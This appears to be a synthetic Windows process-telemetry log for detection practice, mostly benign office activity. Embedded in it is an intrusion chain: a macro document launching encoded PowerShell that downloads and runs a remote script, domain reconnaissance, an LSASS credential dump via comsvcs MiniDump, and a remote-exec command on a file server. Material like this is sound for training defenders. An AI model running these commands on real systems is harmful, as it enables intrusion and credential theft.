event_id,timestamp,event_type,device,user,source,source_ref,process_name,process_id,command_line,parent_process_name,parent_process_id,file_path,sha256,signer,signature_status,process_guid,parent_process_guid
evt-000297,2026-08-17T09:00:28+0000,process,PC03,achen,synthetic,,Teams.exe,6468,"""C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,701,C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid,start:pc03|6468|2026-08-17T09:00:28.000Z,
evt-000299,2026-08-17T09:00:38+0000,process,PC02,SYSTEM,synthetic,,svchost.exe,2317,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,989,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid,start:pc02|2317|2026-08-17T09:00:38.000Z,
evt-000300,2026-08-17T09:00:46+0000,process,PC03,achen,synthetic,,cmd.exe,9601,cmd.exe /c ipconfig /all,explorer.exe,744,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc03|9601|2026-08-17T09:00:46.000Z,
evt-000301,2026-08-17T09:00:48+0000,process,PC03,achen,synthetic,,chrome.exe,8417,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,713,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid,start:pc03|8417|2026-08-17T09:00:48.000Z,
evt-000304,2026-08-17T09:01:27+0000,process,PC05,SYSTEM,synthetic,,MsMpEng.exe,6001,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,956,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid,start:pc05|6001|2026-08-17T09:01:27.000Z,
evt-000305,2026-08-17T09:01:47+0000,process,PC05,klarsen,synthetic,,cmd.exe,1570,cmd.exe /c ipconfig /all,explorer.exe,537,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc05|1570|2026-08-17T09:01:47.000Z,
evt-000306,2026-08-17T09:01:59+0000,process,PC02,mrossi,synthetic,,OneDrive.exe,6688,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,921,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid,start:pc02|6688|2026-08-17T09:01:59.000Z,
evt-000307,2026-08-17T09:02:05+0000,process,PC07,adm_sarah,synthetic,,EXCEL.EXE,7042,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",explorer.exe,635,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,86ce6d98379cd90c47a83301cebfa734f5254eaab5370ada47ff5148df9a9564,Microsoft Corporation,signed_valid,start:pc07|7042|2026-08-17T09:02:05.000Z,
evt-000309,2026-08-17T09:02:06+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,7810,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,668,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid,start:pc01|7810|2026-08-17T09:02:06.000Z,
evt-000310,2026-08-17T09:02:10+0000,process,PC01,jdoe,synthetic,,cmd.exe,8347,cmd.exe /c ipconfig /all,explorer.exe,987,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc01|8347|2026-08-17T09:02:10.000Z,
evt-000315,2026-08-17T09:03:27+0000,process,PC01,SYSTEM,synthetic,,CcmExec.exe,9285,C:\Windows\CCM\CcmExec.exe,services.exe,816,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid,start:pc01|9285|2026-08-17T09:03:27.000Z,
evt-000316,2026-08-17T09:03:33+0000,process,PC03,achen,synthetic,,chrome.exe,7981,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,772,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid,start:pc03|7981|2026-08-17T09:03:33.000Z,
evt-000317,2026-08-17T09:03:36+0000,process,PC02,SYSTEM,synthetic,,CcmExec.exe,1767,C:\Windows\CCM\CcmExec.exe,services.exe,739,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid,start:pc02|1767|2026-08-17T09:03:36.000Z,
evt-000323,2026-08-17T09:04:43+0000,process,PC02,mrossi,synthetic,,Teams.exe,4650,"""C:\Users\mrossi\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,831,C:\Users\mrossi\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid,start:pc02|4650|2026-08-17T09:04:43.000Z,
evt-000326,2026-08-17T09:05:34+0000,process,PC01,jdoe,synthetic,,powershell.exe,2752,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\jdoe\Documents,explorer.exe,937,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc01|2752|2026-08-17T09:05:34.000Z,
evt-000328,2026-08-17T09:06:29+0000,process,PC05,klarsen,synthetic,,OUTLOOK.EXE,4632,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,993,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc05|4632|2026-08-17T09:06:29.000Z,
evt-000329,2026-08-17T09:07:06+0000,process,PC05,SYSTEM,synthetic,,svchost.exe,6752,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,782,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid,start:pc05|6752|2026-08-17T09:07:06.000Z,
evt-000332,2026-08-17T09:07:48+0000,process,PC02,mrossi,synthetic,,chrome.exe,7158,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,518,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid,start:pc02|7158|2026-08-17T09:07:48.000Z,
evt-000339,2026-08-17T09:08:36+0000,process,PC07,SYSTEM,synthetic,,svchost.exe,8034,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,512,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid,start:pc07|8034|2026-08-17T09:08:36.000Z,
evt-000344,2026-08-17T09:09:43+0000,process,PC02,mrossi,synthetic,,notepad.exe,8827,notepad.exe C:\Users\mrossi\Documents\todo.txt,explorer.exe,997,C:\Windows\System32\notepad.exe,4ac6c9c8dc5d9dcedfbe33334993d84f0058e0243ce646ec20e3a44e965cf1ab,Microsoft Corporation,signed_valid,start:pc02|8827|2026-08-17T09:09:43.000Z,
evt-000345,2026-08-17T09:10:03+0000,process,PC07,adm_sarah,synthetic,,OneDrive.exe,2718,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,726,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid,start:pc07|2718|2026-08-17T09:10:03.000Z,
evt-000346,2026-08-17T09:10:10+0000,process,PC02,SYSTEM,synthetic,,MsMpEng.exe,4349,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,573,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid,start:pc02|4349|2026-08-17T09:10:10.000Z,
evt-000348,2026-08-17T09:10:22+0000,process,PC03,achen,synthetic,,WINWORD.EXE,6458,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\achen\Documents\Notes.docx""",OUTLOOK.EXE,591,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid,start:pc03|6458|2026-08-17T09:10:22.000Z,
evt-000349,2026-08-17T09:10:31+0000,process,PC07,adm_sarah,synthetic,,powershell.exe,3064,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,586,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc07|3064|2026-08-17T09:10:31.000Z,
evt-000351,2026-08-17T09:10:40+0000,process,PC01,SYSTEM,synthetic,,CcmExec.exe,6989,C:\Windows\CCM\CcmExec.exe,services.exe,506,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid,start:pc01|6989|2026-08-17T09:10:40.000Z,
evt-000353,2026-08-17T09:11:25+0000,process,PC03,achen,synthetic,,Teams.exe,9824,"""C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe""",explorer.exe,773,C:\Users\achen\AppData\Local\Microsoft\Teams\current\Teams.exe,36a56f9b27c4873d0fae10914a47afce81bf58fe0e29c9cf202c9f4d3d367414,Microsoft Corporation,signed_valid,start:pc03|9824|2026-08-17T09:11:25.000Z,
evt-000355,2026-08-17T09:12:04+0000,process,PC01,jdoe,synthetic,,WINWORD.EXE,4820,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\jdoe\Downloads\Invoice_Q3_2026.docm""",OUTLOOK.EXE,2001,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid,start:pc01|4820|2026-08-17T09:12:04.000Z,start:pc01|2001|2026-08-17T08:00:00.000Z
evt-000357,2026-08-17T09:12:41+0000,process,PC01,jdoe,synthetic,,powershell.exe,6612,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AYQAuAHAAcwAxACcAKQA=,WINWORD.EXE,4820,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc01|6612|2026-08-17T09:12:41.000Z,start:pc01|4820|2026-08-17T09:12:04.000Z
evt-000361,2026-08-17T09:13:05+0000,process,PC02,SYSTEM,synthetic,,MsMpEng.exe,4487,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,653,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid,start:pc02|4487|2026-08-17T09:13:05.000Z,
evt-000367,2026-08-17T09:15:03+0000,process,PC01,jdoe,synthetic,,whoami.exe,7000,whoami.exe /all,powershell.exe,6612,C:\Windows\System32\whoami.exe,ad04c647be59a0820402e9149924d655340109d1229ee5cec15a3cb1ebdd5178,Microsoft Corporation,signed_valid,start:pc01|7000|2026-08-17T09:15:03.000Z,start:pc01|6612|2026-08-17T09:12:41.000Z
evt-000368,2026-08-17T09:15:10+0000,process,PC05,SYSTEM,synthetic,,MsMpEng.exe,7593,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,709,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid,start:pc05|7593|2026-08-17T09:15:10.000Z,
evt-000370,2026-08-17T09:15:20+0000,process,PC01,jdoe,synthetic,,net.exe,7001,"net group ""Domain Admins"" /domain",powershell.exe,6612,C:\Windows\System32\net.exe,b643b88cddf43f426d1231386a248f252872bebe45c773b70c0a3ac3c9c500ca,Microsoft Corporation,signed_valid,start:pc01|7001|2026-08-17T09:15:20.000Z,start:pc01|6612|2026-08-17T09:12:41.000Z
evt-000371,2026-08-17T09:15:22+0000,process,PC05,klarsen,synthetic,,powershell.exe,5874,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,794,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc05|5874|2026-08-17T09:15:22.000Z,
evt-000373,2026-08-17T09:15:34+0000,process,PC07,SYSTEM,synthetic,,MsMpEng.exe,2686,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,848,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid,start:pc07|2686|2026-08-17T09:15:34.000Z,
evt-000374,2026-08-17T09:15:37+0000,process,PC01,jdoe,synthetic,,nltest.exe,7002,nltest /domain_trusts,powershell.exe,6612,C:\Windows\System32\nltest.exe,02927cbf9632ab131899b67b8fbba9bf8221ab409e346290d5492c06708132a1,Microsoft Corporation,signed_valid,start:pc01|7002|2026-08-17T09:15:37.000Z,start:pc01|6612|2026-08-17T09:12:41.000Z
evt-000378,2026-08-17T09:17:31+0000,process,PC05,klarsen,synthetic,,cmd.exe,6608,cmd.exe /c ipconfig /all,explorer.exe,822,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc05|6608|2026-08-17T09:17:31.000Z,
evt-000381,2026-08-17T09:18:22+0000,process,PC01,jdoe,synthetic,,rundll32.exe,7420,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full",powershell.exe,6612,C:\Windows\System32\rundll32.exe,b2eefe9133c548f9834fe6fa1e3a142e55dc854a07b91e15606778e4eeadc8b2,Microsoft Corporation,signed_valid,start:pc01|7420|2026-08-17T09:18:22.000Z,start:pc01|6612|2026-08-17T09:12:41.000Z
evt-000385,2026-08-17T09:20:03+0000,process,PC02,mrossi,synthetic,,OUTLOOK.EXE,9251,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,545,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc02|9251|2026-08-17T09:20:03.000Z,
evt-000387,2026-08-17T09:20:50+0000,process,PC02,mrossi,synthetic,,OUTLOOK.EXE,6192,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,646,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc02|6192|2026-08-17T09:20:50.000Z,
evt-000388,2026-08-17T09:20:53+0000,process,PC07,adm_sarah,synthetic,,OneDrive.exe,1259,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,576,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid,start:pc07|1259|2026-08-17T09:20:53.000Z,
evt-000391,2026-08-17T09:21:45+0000,process,PC01,SYSTEM,synthetic,,svchost.exe,8966,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,690,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid,start:pc01|8966|2026-08-17T09:21:45.000Z,
evt-000394,2026-08-17T09:22:07+0000,process,PC03,achen,synthetic,,chrome.exe,6763,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",explorer.exe,635,C:\Program Files\Google\Chrome\Application\chrome.exe,f85020382d7f774d618a37f55785c8e36c16cd1ee4234a075ac597a338246056,Google LLC,signed_valid,start:pc03|6763|2026-08-17T09:22:07.000Z,
evt-000397,2026-08-17T09:22:31+0000,process,PC02,mrossi,synthetic,,WINWORD.EXE,3574,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\mrossi\Documents\Notes.docx""",OUTLOOK.EXE,820,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,b9220cb750b241996d0b9300e4483f46310c1ca0bc896673ec5cdb9be1f05935,Microsoft Corporation,signed_valid,start:pc02|3574|2026-08-17T09:22:31.000Z,
evt-000398,2026-08-17T09:22:43+0000,process,PC01,SYSTEM,synthetic,,CcmExec.exe,2527,C:\Windows\CCM\CcmExec.exe,services.exe,697,C:\Windows\CCM\CcmExec.exe,cc9bf47a6aaa2e5437c78201e0304c41d66de7d5eba360a604e268b16618ad54,Microsoft Corporation,signed_valid,start:pc01|2527|2026-08-17T09:22:43.000Z,
evt-000400,2026-08-17T09:23:15+0000,process,PC01,jdoe,synthetic,,powershell.exe,2809,powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1,CcmExec.exe,949,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc01|2809|2026-08-17T09:23:15.000Z,
evt-000402,2026-08-17T09:23:47+0000,process,PC07,adm_sarah,synthetic,,OUTLOOK.EXE,1846,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,993,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc07|1846|2026-08-17T09:23:47.000Z,
evt-000403,2026-08-17T09:23:48+0000,process,PC05,klarsen,synthetic,,powershell.exe,6125,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\klarsen\Documents,explorer.exe,512,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc05|6125|2026-08-17T09:23:48.000Z,
evt-000404,2026-08-17T09:24:08+0000,process,PC05,SYSTEM,synthetic,,MsMpEng.exe,1218,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe""",services.exe,560,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe,1947b41bee61ee8d8f9f93b8a39538c19c5b031b1d2dc530e487ca3ecea0859b,Microsoft Corporation,signed_valid,start:pc05|1218|2026-08-17T09:24:08.000Z,
evt-000406,2026-08-17T09:24:37+0000,process,PC03,achen,synthetic,,OUTLOOK.EXE,4264,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,836,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc03|4264|2026-08-17T09:24:37.000Z,
evt-000408,2026-08-17T09:25:33+0000,process,PC05,klarsen,synthetic,,OneDrive.exe,2533,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background",explorer.exe,842,C:\Program Files\Microsoft OneDrive\OneDrive.exe,50e450d19c07060403b81dac6709fbede4289c86258579c33a38f914fc917c0f,Microsoft Corporation,signed_valid,start:pc05|2533|2026-08-17T09:25:33.000Z,
evt-000409,2026-08-17T09:25:45+0000,process,PC07,adm_sarah,synthetic,,cmd.exe,8949,cmd.exe /c ipconfig /all,explorer.exe,885,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc07|8949|2026-08-17T09:25:45.000Z,
evt-000411,2026-08-17T09:26:06+0000,process,PC02,mrossi,synthetic,,cmd.exe,6965,cmd.exe /c ipconfig /all,explorer.exe,655,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc02|6965|2026-08-17T09:26:06.000Z,
evt-000416,2026-08-17T09:27:20+0000,process,PC07,adm_sarah,synthetic,,OUTLOOK.EXE,8871,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,615,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc07|8871|2026-08-17T09:27:20.000Z,
evt-000417,2026-08-17T09:27:45+0000,process,PC05,klarsen,synthetic,,OUTLOOK.EXE,9579,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",explorer.exe,814,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,77904e5a4280e8f7c92e5bcf8a4c6b9930ceb0b88d415ac3398afbfe15f71d0d,Microsoft Corporation,signed_valid,start:pc05|9579|2026-08-17T09:27:45.000Z,
evt-000420,2026-08-17T09:28:05+0000,process,PC02,mrossi,synthetic,,EXCEL.EXE,9855,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",explorer.exe,557,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,86ce6d98379cd90c47a83301cebfa734f5254eaab5370ada47ff5148df9a9564,Microsoft Corporation,signed_valid,start:pc02|9855|2026-08-17T09:28:05.000Z,
evt-000423,2026-08-17T09:28:15+0000,process,PC03,achen,synthetic,,notepad.exe,6144,notepad.exe C:\Users\achen\Documents\todo.txt,explorer.exe,723,C:\Windows\System32\notepad.exe,4ac6c9c8dc5d9dcedfbe33334993d84f0058e0243ce646ec20e3a44e965cf1ab,Microsoft Corporation,signed_valid,start:pc03|6144|2026-08-17T09:28:15.000Z,
evt-000424,2026-08-17T09:28:18+0000,process,PC03,achen,synthetic,,EXCEL.EXE,5678,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",explorer.exe,909,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,86ce6d98379cd90c47a83301cebfa734f5254eaab5370ada47ff5148df9a9564,Microsoft Corporation,signed_valid,start:pc03|5678|2026-08-17T09:28:18.000Z,
evt-000430,2026-08-17T09:28:45+0000,process,PC01,jdoe,synthetic,,notepad.exe,9207,notepad.exe C:\Users\jdoe\Documents\todo.txt,explorer.exe,567,C:\Windows\System32\notepad.exe,4ac6c9c8dc5d9dcedfbe33334993d84f0058e0243ce646ec20e3a44e965cf1ab,Microsoft Corporation,signed_valid,start:pc01|9207|2026-08-17T09:28:45.000Z,
evt-000435,2026-08-17T09:29:21+0000,process,PC03,achen,synthetic,,powershell.exe,1417,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\achen\Documents,explorer.exe,587,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc03|1417|2026-08-17T09:29:21.000Z,
evt-000436,2026-08-17T09:29:21+0000,process,PC07,adm_sarah,synthetic,,EXCEL.EXE,3036,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",explorer.exe,637,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,86ce6d98379cd90c47a83301cebfa734f5254eaab5370ada47ff5148df9a9564,Microsoft Corporation,signed_valid,start:pc07|3036|2026-08-17T09:29:21.000Z,
evt-000443,2026-08-17T09:30:14+0000,process,PC07,SYSTEM,synthetic,,svchost.exe,3864,C:\Windows\System32\svchost.exe -k netsvcs -p,services.exe,707,C:\Windows\System32\svchost.exe,b06a818ffb92db5acd3189cb850cc0c456f26cc1999aa44d1e70da0ebca9133f,Microsoft Corporation,signed_valid,start:pc07|3864|2026-08-17T09:30:14.000Z,
evt-000445,2026-08-17T09:30:42+0000,process,PC07,adm_sarah,synthetic,,powershell.exe,6518,powershell.exe -NoProfile -Command Get-ChildItem C:\Users\adm_sarah\Documents,explorer.exe,809,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0c907184a57442868c519c7516828c80b7092649d8af72d6a1d225cd8fa6ee07,Microsoft Corporation,signed_valid,start:pc07|6518|2026-08-17T09:30:42.000Z,
evt-000452,2026-08-17T09:32:48+0000,process,PC02,mrossi,synthetic,,cmd.exe,3081,cmd.exe /c ipconfig /all,explorer.exe,861,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:pc02|3081|2026-08-17T09:32:48.000Z,
evt-000456,2026-08-17T09:33:25+0000,process,PC03,achen,synthetic,,EXCEL.EXE,1492,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",explorer.exe,744,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,86ce6d98379cd90c47a83301cebfa734f5254eaab5370ada47ff5148df9a9564,Microsoft Corporation,signed_valid,start:pc03|1492|2026-08-17T09:33:25.000Z,
evt-000461,2026-08-17T09:34:12+0000,process,FS02,svc_backup,synthetic,,cmd.exe,2244,cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1755419652 2>&1,services.exe,712,C:\Windows\System32\cmd.exe,b875b0cc7d9c4771cf52cd30f09246a405787d4064b34d0aa14f556098f87465,Microsoft Corporation,signed_valid,start:fs02|2244|2026-08-17T09:34:12.000Z,
